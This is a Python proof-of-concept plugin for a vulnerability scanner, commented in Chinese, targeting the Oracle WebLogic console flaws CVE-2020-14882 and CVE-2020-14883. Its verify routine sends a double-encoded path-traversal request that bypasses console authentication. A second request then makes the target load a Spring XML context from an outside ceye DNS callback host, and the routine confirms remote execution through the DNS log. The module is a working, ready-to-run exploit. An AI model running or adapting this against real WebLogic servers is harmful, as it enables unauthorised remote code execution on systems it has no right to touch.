# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua,get_ceye_dns,verify_ceye_dns,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            需要ceye
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）",                        # 漏洞名称
        "VulnID" : "CVE-2020-14882，CVE-2020-14883",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Weblogic",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            因为懒得写所以，直接抄P牛vulhub中对该漏洞的描述：  
            
            Weblogic是Oracle公司推出的J2EE应用服务器。
            在2020年10月的更新中，Oracle官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞，
            分别是CVE-2020-14882和CVE-2020-14883。

            CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，
            CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。
            使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]

        success,dns_flag = get_ceye_dns()
        if success == False:
            return [False,dns_flag]

        url0 = self.target + "/console/css/%252e%252e%252fconsole.portal" # url自己按需调整
        url1 = self.target + '/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://{dns}/")'.format(dns = dns_flag)
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            session = requests.Session()
            req0 = session.get(url0,headers = headers , proxies = self.proxy ,timeout = 20,verify = False)
            req1 = session.get(url1,headers = headers , proxies = self.proxy ,timeout = 20,verify = False)
            flager = verify_ceye_dns(dns_flag)

            if flager == True:
                vuln = [True,dns_flag]
            elif flager == False:
                vuln = [False,dns_flag]
            else:
                vuln = [False,flager]

        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()